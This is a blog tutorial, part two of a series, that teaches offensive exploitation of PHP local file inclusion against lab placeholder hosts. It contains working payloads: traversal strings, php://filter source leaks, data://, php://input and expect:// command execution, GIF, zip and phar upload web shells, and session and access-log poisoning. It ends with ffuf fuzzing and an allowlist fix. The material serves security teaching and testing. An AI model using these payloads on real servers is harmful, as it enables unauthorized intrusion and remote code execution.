# :globe_with_meridians: Ehxb | Inside the Filesystem: The Truth Behind LFI & RFI II

---

# Ehxb | Inside the Filesystem: The Truth Behind LFI & RFI II

Part 1 gave you the mental model. Part 2 is where we start breaking things on purpose.

In this part, you’ll:

- Take the classic `../../../../etc/passwd` test and expand it into a full LFI playbook, from basic path traversal to mapping the entire server.

- Learn how older PHP quirks like path truncation and null-byte injection still show up on legacy systems and how to safely test for them.

- Turn LFI into a source code disclosure engine with `php://filter` and then into a fileless RCE primitive with `data://`, `php://input`, and `expect://`.

- Chain LFI with uploads, sessions, and logs so that an avatar, a cookie, or an access log line can become your shell.

- Use automation (ffuf + LFI wordlists + old tooling) to quickly find parameters, paths, and configs worth your manual time.

If Part 1 made you suspicious of `?page=`, Part 2 shows you how to turn that suspicion into working exploits.

## 1. From Cute Path Traversal to Serious LFI

Every LFI journey starts simple:

```
?page=../../../../etc/passwd
```

If the response comes back with something like this:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
```

you’ve just confirmed that:

- Your parameter controls a file path.

- The server will happily read outside the webroot.

At first, most people stop at `/etc/passwd`. But that’s just the Hello World of LFI.

### 1.1 Mental Model: Where Are You in the Tree?

0

Recall the filesystem we visualized in Part 1:

You’re typically starting in something like `/var/www/html/`.

With a vulnerable:

```
include($_GET['page']);
```

and a payload like:

```
?page=../../../../etc/passwd
```

Once you understand that movement, you can systematically crawl for:

- `/etc/hosts` – hostnames and sometimes internal naming clues.

- `/etc/fstab` – mounts and interesting disks.

- `/etc/login.defs` – password policies.

- `/etc/apache2/apache2.conf`, `/etc/nginx/nginx.conf` – configs that reveal DocumentRoot, log paths, modules, etc.

These aren’t just trophies. They’re inputs to further exploitation:

- Configs show you where logs live, which enables log poisoning.

- Configs can reveal other virtual hosts and internal-only paths.

- Configs may show you user/group identities and permission boundaries.

LFI is a telescope into the host. Stop thinking “one file” and start thinking “map the environment.”

## 2. When the App Forces an Extension: Suffixes, Path Truncation, and Null Bytes

Real-world apps often don’t let you craft a full arbitrary path. A common pattern in PHP is:

```
$language = $_GET['language']; // e.g. "en", "fr"
include($language . '.php');
```

Even if you send `/etc/passwd`, the final path becomes:

```
/etc/passwd.php
```

which usually doesn’t exist.

On modern PHP, many older bypass tricks have been patched. But on legacy systems — which you absolutely still see on internal networks, old appliances, and “don’t touch it, it works” servers — two techniques from the original notes are still worth knowing: path truncation and null byte injection.

### 2.1 Path Truncation (Legacy PHP)

Older PHP (pre 5.3/5.4) had a defined string length limit: 4096 characters. If a string exceeded that, PHP would silently truncate it.

Combine that with path normalization rules:

- Trailing `/.` is ignored (`/etc/passwd/.` → `/etc/passwd`).

- Multiple slashes are collapsed (`////etc/passwd` → `/etc/passwd`).

- `.` directory shortcuts vanish (`/etc/./passwd` → `/etc/passwd`).

Attackers realized they could craft very long paths such that:

- The actual path (e.g., `/etc/passwd`) survives.

- The appended extension (e.g., `.php`) gets chopped off beyond the limit.

High-level payload shape:

```
?language=non_existing_directory/../../../etc/passwd/././././.[REPEATED ~2048 times]
```

You don’t write this by hand. You script it, as in the original notes:

```
0xEhxb@KanSec[/htb]$ echo -n "non_existing_directory/../../../etc/passwd/" && \
for i in {1..2048}; do echo -n "./"; done
non_existing_directory/../../../etc/passwd/./././<SNIP>././././
```

Key constraints:

- Start with a non-existent directory so PHP does extra normalization.

- Ensure the total length hits the point where only `.php` is truncated, not `/etc/passwd`.

Is this still relevant? On well-maintained Internet-facing systems, usually not. On that weird legacy billing VM in the corner that everyone is scared to reboot? Absolutely.

### 2.2 Null Byte Injection (`%00`) on PHP < 5.5

The other legacy bypass is null byte injection.

At low levels (C, C++), strings are terminated by a null byte (`\x00`). Pre-5.5, PHP allowed user input containing `%00`, which could terminate the string early when passed to underlying system calls.

So if the application built:

```
/etc/passwd%00.php
```

then the underlying C layer might treat the path as:

```
/etc/passwd
```

This means:

- You send `/etc/passwd%00` as your `language` value.

- The PHP script appends `.php`, getting `/etc/passwd%00.php`.

- The null byte truncates the string at `/etc/passwd` before it hits the filesystem.

You’ve bypassed the enforced `.php` extension.

These tricks are dead on modern PHP, but:

- They still show up on embedded systems.

- They matter during internal red teams where old platforms hide.

- They’re helpful to understand why modern safeguards exist and why upgrades aren’t just feature churn.

From a defensive perspective, these legacy sections are a reminder: running old runtimes keeps old bugs alive.

## 3. Turning LFI into a Source Code Disclosure Engine

If you include a `.php` file via LFI, you usually see the output, not the source.

For example, including `config.php` might produce nothing visible:

- It defines configuration constants.

- It sets up DB connections.

- It doesn’t echo anything.

As an attacker or security engineer, you care about the source code.

Enter PHP filters, specifically `php://filter` with `convert.base64-encode`.

### 3.1 PHP Filter Wrapper Basics

The `php://` family exposes special streams. `php://filter` lets you apply filters to a resource as you read it.

Syntax:

```
php://filter/read=<filter_list>/resource=<target>
```

For LFI, the star of the show is:

- `convert.base64-encode` — base64-encodes content instead of running it.

Imagine you have a parameter `language` that ends up in `include()` with `.php` appended, as in the original notes. You want the source of `config.php`.

Instead of:

```
?language=config
```

you request:

```
?language=php://filter/read=convert.base64-encode/resource=config
```

The server will:

- Build the path as `php://filter/read=convert.base64-encode/resource=config.php`.

- Read `config.php` through the filter.

- Return a base64-encoded string.

Locally, you decode:

```
0xEhxb@htb[/htb]$ echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
...SNIP...
if ($_SERVER['REQUEST_METHOD'] == 'GET' && realpath(__FILE__) == realpath($_SERVER['SCRIPT_FILENAME'])) {
header('HTTP/1.0 403 Forbidden', TRUE, 403);
die(header('location: /index.php'));
}
...SNIP...
```

Now you’re reading live application source.

This pattern turns LFI from “file existence checker” into “continuous code review channel.”

### 3.2 Hunting for Interesting PHP Files

Once you realize you can read PHP sources, the next step is enumeration:

- Which PHP files exist?

- Which ones contain sensitive logic (auth, uploads, admin panels)?

The original notes recommend using tools like `ffuf` to fuzz for PHP files:

```
0xEhxb@htb[/htb]$ ffuf \
-w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
-u http://<SERVER_IP>:<PORT>/FUZZ.php
```

```
index [Status: 200, Size: 2652, Words: 690, Lines: 64]
config [Status: 302, Size: 0, Words: 1, Lines: 1]
```

Notes from the field:

- Don’t restrict yourself to HTTP 200. With LFI, `301`, `302`, and even `403` can still be sources you can read through filters.

- After identifying a file, read its source with `php://filter`.

- Inside each source file, look for other includes or `require()` calls and follow those paths.

You’re essentially doing static analysis through an LFI leak.

## 4. LFI → RCE via PHP Wrappers: `data://`, `php://input`, `expect://`

So far, we’ve used LFI + filters to read data. Let’s use wrappers to execute code.

We’ll build directly on the original sections about `data`, `input`, and `expect` wrappers.

### 4.1 Checking `allow_url_include`

Many of these tricks require `allow_url_include = On` in `php.ini`.

With an existing LFI, you can read and decode `php.ini`:

```
[!bash!]$ curl \
"http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
# ... base64 string ...
[!bash!]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
allow_url_include = On
```

If that line is `On`, it’s your green light.

### 4.2 `data://` – Inline Base64 Web Shell

The `data` wrapper lets you treat data embedded in the URI as if it were a file.

- Craft a simple web shell and base64-encode it:

```
[!bash!]$ echo '<?php system($_GET["cmd"]); ?>' | base64
PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

- URL-encode the base64 string and use it as the `language` parameter:

```
[!bash!]$ curl -s \
'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' \
| grep uid
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

You got command execution without creating any file on disk.

### 4.3 `php://input` – POST Body as Code

The `php://input` wrapper treats the raw HTTP request body as a stream.

If the vulnerable parameter accepts something like `language=php://input`, you can push your code in the POST body and the server will include it.

```
[!bash!]$ curl -s -X POST \
--data '<?php system($_GET["cmd"]); ?>' \
"http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" \
| grep uid
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

This is:

- Fileless.

- Very stealthy (no persistent artifact unless logs capture the body).

### 4.4 `expect://` – Direct Command Execution

The `expect` wrapper (when installed and enabled) gives you a direct command execution stream.

First, confirm the extension in `php.ini` via LFI + base64 + `grep expect`, as shown in the original notes.

If it’s enabled:

```
[!bash!]$ curl -s \
"http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

No web shells. No uploads. Just raw command execution.

>

Note: `expect` is not enabled by default. When you find it in the wild, treat it as a high-value misconfiguration.

## 5. LFI + File Uploads: When Avatars Become Shells

File uploads are everywhere: avatars, documents, invoices, resumes. Devs often put a lot of effort into “secure uploads”:

- Limiting to image extensions (`.jpg`, `.png`, `.gif`).

- Checking MIME types.

- Inspecting magic bytes.

But if you have LFI on an executable include function (`include`, `require`, certain templating engines), it often doesn’t matter:

>

If the vulnerable function executes whatever file you point it at, and you can upload a file to the server, you can turn that upload into code execution — even if it’s not directly web-accessible.

### 5.1 Malicious Image Payload (GIF Shell)

The original notes show a simple and effective payload using GIF magic bytes.

Create a file that:

- Starts with `GIF8` (valid-ish GIF header for basic checks).

- Contains a PHP web shell.

```
0xEhxb@htb[/htb]$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

Upload `shell.gif` via the app’s avatar/profile upload.

If the app lets you see the uploaded image path, you might find something like:

```
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
```

Now combine with LFI:

```
?language=./profile_images/shell.gif&cmd=id
```

If the vulnerable function executes PHP, that GIF is no longer an image — it’s your shell.

>

If the app prepends directories (e.g., `includes/`), you may need some `../` gymnastics to reach `profile_images/`.

### 5.2 Zip Upload + `zip://` Wrapper

If the app accepts archives or fails to correctly detect content types, you can abuse the `zip://` wrapper.

- Create a PHP shell and zip it:

```
0xEhxb@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
0xEhxb@htb[/htb]$ zip shell.jpg shell.php
```

- Upload `shell.jpg`.

- Include it using the zip wrapper:

```
?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

Where `%23` is URL-encoded `#`, used to target `shell.php` inside the archive.

## Get Ehxb’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

Requires:

- PHP’s zip wrapper enabled.

- Upload of archives (or mis-detection of `shell.jpg` as a valid file type).

### 5.3 Phar Upload + `phar://` Wrapper

Phar archives are another PHP-specific vector.

From the original notes, a script to generate a malicious Phar:

```
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```

Compile and rename:

```
0xEhxb@htb[/htb]$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

Upload `shell.jpg` and then include it via:

```
?language=phar://./profile_images/shell.jpg/shell.txt&cmd=id
```

This executes the code inside `shell.txt` through the Phar wrapper.

### 5.4 Which Upload Attack Should You Try First?

From most reliable to more niche:

- GIF or image polyglot: easiest to get past naive filters.

- Zip wrapper: depends on upload policy and wrapper availability.

- Phar wrapper: powerful when conditions align, but more niche.

The key point: with LFI on an execute-capable function, any file you can make the server write (uploads, logs, sessions) is a potential execution vector.

## 6. Log & Session Poisoning: When Logs Become Shells

The original notes lay out a pivotal idea:

>

If the application logs or stores data that you control, and you can include those files via LFI in an execute-capable function, you can often turn them into web shells.

Two prime targets:

- PHP sessions.

- Web server logs (Apache, Nginx).

### 6.1 PHP Session Poisoning

Typical PHP sessions on Linux live in:

Session files look like:

```
sess_<PHPSESSID_VALUE>
```

Example from the notes: if your browser’s `PHPSESSID` cookie is `nhhv8i0o6ua4g88bkdl9u1fdsd`, then your session file is probably:

```
/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```

Attack outline:

- Confirm your session ID via dev tools.

- Use `?language=` to include the session file via LFI:

```
?language=../../../../var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```

- Inspect the contents. You might see keys like `page` and `preference`. In the notes, `page` is user-controlled through `?language=`, while `preference` isn’t.

- Test you can influence `page` by visiting:

```
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
```

Then re-include the session file and see if `session_poisoning` appears.

- Once confirmed, poison the session by setting `language` to URL-encoded PHP:

```
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

- Finally, include the session file and pass a `cmd` parameter:

```
http://<SERVER_IP>:<PORT>/index.php?language=../../../../var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```

You’ve turned your own session into a web shell.

>

Note: Each time the session is written, your payload might be overwritten. Use your shell to drop a more stable backdoor or send a reverse shell.

### 6.2 Web Server Log Poisoning (Apache/Nginx)

Web servers log every request. Access logs in particular capture:

- Remote IP.

- Request path.

- Status code.

- User-Agent header (which you control).

Typical log paths:

- Apache on Linux: `/var/log/apache2/access.log`, `/var/log/apache2/error.log`.

- Nginx on Linux: `/var/log/nginx/access.log`, `/var/log/nginx/error.log`.

- XAMPP on Windows: `C:\xampp\apache\logs\`.

### Step 1: Confirm LFI Can Read Logs

Try including the Apache access log:

```
?language=../../../../var/log/apache2/access.log
```

If you see entries, your LFI has permission to read it.

### Step 2: Poison the Log

Craft a malicious `User-Agent` value and send a request that gets logged.

```
[!bash!]$ echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
[!bash!]$ curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
```

Now `access.log` contains a line with your PHP code as the User-Agent.

### Step 3: Execute via LFI

Include the log file with a `cmd` parameter:

```
?language=../../../../var/log/apache2/access.log&cmd=id
```

If the vulnerable function executes PHP, your User-Agent becomes a shell.

>

Warning: Logs can be huge. Repeatedly including multi-megabyte logs via LFI can be slow or cause DoS issues.

### 6.2.1 Other Poisonable Logs and `/proc`

The original notes also mention:

- `/var/log/sshd.log` – SSH logs.

- `/var/log/mail` – Mail server logs.

- `/var/log/vsftpd.log` – FTP logs.

If you can:

- Reach the service (SSH/FTP/mail).

- Control a logged field (username, email contents).

- Read the log via LFI.

…you can perform the same log poisoning → LFI include → RCE trick.

Finally, `/proc`-based tricks:

- `/proc/self/environ` can contain environment and sometimes header-derived data.

- `/proc/self/fd/N` may expose file descriptors that include your request data.

If these are readable via LFI and hold attacker-controlled content, they can sometimes act as alternative log poisoning surfaces.

## 7. Automation and Discovery: Fuzzing LFI Like a Pro

Manual exploitation is crucial, but you don’t want to hand-test every parameter across a large app.

The original notes cover three main categories of automation:

- Parameter fuzzing.

- LFI payload fuzzing.

- Path and config fuzzing.

### 7.1 Fuzzing for Hidden Parameters

Some of the juiciest LFI primitives live on parameters not exposed in forms.

Use `ffuf` with a parameter name wordlist:

```
[!bash!]$ ffuf \
-w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
-u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' \
-fs 2287
language [Status: xxx, Size: xxx, Words: xxx, Lines: xxx]
```

When a parameter like `language` produces a different-sized response than others, it’s a candidate for deeper testing.

You can also prioritize known “LFI-ish” parameter names (from references like HackTricks): `page`, `file`, `path`, `template`, `include`, `lang`, etc.

### 7.2 Fuzzing for LFI Payloads (Wordlists)

Once you have a parameter you suspect is vulnerable (say, `?language=`), use an LFI payload wordlist to quickly test a huge set of traversals and file paths.

From the notes, `LFI-Jhaddix.txt` is a good starting point:

```
[!bash!]$ ffuf \
-w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
-u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' \
-fs 2287
../../../../etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
..%2F..%2F..%2F..%2Fetc%2Fpasswd [Status: 200, Size: 3661, Words: 645, Lines: 91]
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
```

Different encodings (`../`, `%2e%2e/`, `/..;/`) help bypass naive filters and WAFs.

Always manually verify interesting hits to ensure you’re seeing real file contents, not just generic error pages.

### 7.3 Fuzzing for Webroots, Configs, and Logs

Beyond `/etc/passwd`, it’s crucial to discover:

- The webroot path (e.g., `/var/www/html`).

- Server configs (e.g., `apache2.conf`, `envvars`).

- Exact log locations.

Example from the notes — fuzzing for webroot using a default-directory wordlist:

```
[!bash!]$ ffuf \
-w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ \
-u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' \
-fs 2287
/var/www/html/ [Status: 200, Size: 0, Words: 1, Lines: 1]
```

Now you know the true webroot, which is helpful for absolute path exploitation (e.g., uploaded files whose relative path is tricky).

For configs and logs, the notes mention DragonJAR’s Linux/Windows LFI wordlists. Example usage:

```
[!bash!]$ ffuf \
-w ./LFI-WordList-Linux:FUZZ \
-u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' \
-fs 2287
/etc/hosts
/etc/apache2/apache2.conf
/etc/apache2/envvars
/etc/login.defs
/etc/fstab
...
```

Reading `apache2.conf` via LFI might reveal:

```
DocumentRoot /var/www/html
ErrorLog ${APACHE_LOG_DIR}/error.log
CustomLog ${APACHE_LOG_DIR}/access.log combined
```

Then reading `envvars` gives you the value of `APACHE_LOG_DIR`:

```
export APACHE_LOG_DIR=/var/log/apache2$SUFFIX
```

Now you know exactly where to aim your log poisoning attack.

### 7.4 LFI Tools

Classic tools from the original notes include:

Most of them:

- Enumerate common interesting files (`/etc/passwd`, configs, logs).

- Try known wrappers and payloads.

- Attempt to automate RCE primitives.

They’re often unmaintained and tied to Python 2, but still useful as helpers when you understand what they’re doing.

## 8. Common Developer Mistakes That Keep LFI Alive

Let’s zoom out and look at why LFI persists, even in 2020+ code.

### 8.1 Direct Trust in User Input

The core anti-pattern:

```
include($_GET['page']);
```

or its cousins:

- `fs.readFile(path.join(__dirname, req.query.file))`.

- `<jsp:include page="<%= request.getParameter("template") %>" />`.

- `@Html.Partial(HttpContext.Request.Query["view"])`.

The fix is not “sanitize more” but don’t wire user input directly into file APIs at all.

### 8.2 Weak Directory Traversal Filters

Many devs think this is enough:

```
if (strpos($_GET['page'], '../') !== false) {
die('nope');
}
```

Attackers respond with:

- URL-encoded traversal: `%2e%2e/`.

- Mixed encodings and multiple slashes: `/..////../`.

- Unicode and odd encodings.

Or they forget about traversal entirely and just use wrappers (`php://filter`, `php://input`, `data://`, `phar://`).

### 8.3 No Whitelist / Mapping Layer

A safer pattern (we’ll revisit this from the defender side in Part 3) is:

```
$allowed_pages = [
'home' => 'home.php',
'about' => 'about.php',
'contact'=> 'contact.php',
];
$page = $_GET['page'] ?? 'home';
if (!array_key_exists($page, $allowed_pages)) {
$page = 'home';
}
include($allowed_pages[$page]);
```

Here, user input chooses a logical name, not a raw path. The application chooses the actual file path.

### 8.4 Overlooking Non-Obvious Parameters

Developers may carefully guard parameters used in forms but forget about:

- Legacy parameters used by old features.

- Hidden parameters used by JS or internal tools.

- Query parameters on admin-only URLs that get repurposed.

As a pentester, this is why you always combine parameter fuzzing with LFI payload fuzzing.

>

Part 2 — What You Should Walk Away With

Reading `/etc/passwd` is just the warm‑up; the real power of LFI comes from chaining it with uploads, sessions, logs, and wrappers until you hit RCE.

Old-school tricks like path truncation and null bytes are still worth knowing for legacy and internal targets — even if modern PHP has patched them.

`php://filter/read=convert.base64-encode/resource=...` turns a vulnerable include into a steady source code leak, exposing config files and business logic.

Wrappers such as `data://`, `php://input`, and `expect://` give you ways to execute code without ever dropping a PHP file on disk.

LFI plus a “safe” upload feature or a noisy access log is often enough to land a web shell if the include function executes what it reads.

Automation (ffuf, curated wordlists, old LFI tools) helps you quickly find where to focus, but you still need a solid manual understanding to bypass filters and WAFs.

The same coding patterns keep showing up: directly including user input, half-baked traversal filters, and no allowlists — these are what make LFI a repeat guest in modern apps.

In Part 3, we’ll look outward: pure RFI, dangerous wrapper chains, and the defensive patterns that stop your own `include()` calls from turning against you.

---
